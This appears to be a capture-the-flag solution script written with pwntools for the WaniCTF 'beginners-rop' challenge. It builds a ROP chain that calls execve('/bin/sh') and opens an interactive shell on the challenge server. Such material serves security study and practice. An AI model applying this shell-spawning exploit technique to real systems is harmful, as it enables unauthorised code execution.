from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./chall')

p = process('./chall')
p = remote('beginners-rop-pwn.wanictf.org', '9005')

pop_rax_ret = 0x0000000000401371
xor_rsi_ret = 0x000000000040137e
xor_rdx_ret = 0x000000000040138d
mov_rsp_rdi_add_rsp_8_ret = 0x000000000040139c
syscall = 0x00000000004013af

payload = flat(
    b'a' * 0x28,
    pop_rax_ret,
    0x3b,
    xor_rsi_ret,
    xor_rdx_ret,
    mov_rsp_rdi_add_rsp_8_ret,
    0x68732f6e69622f,
    syscall
)
payload.ljust(96, b'\0')
p.sendafter(b'your input (max. 96 bytes) > ', payload)

p.interactive()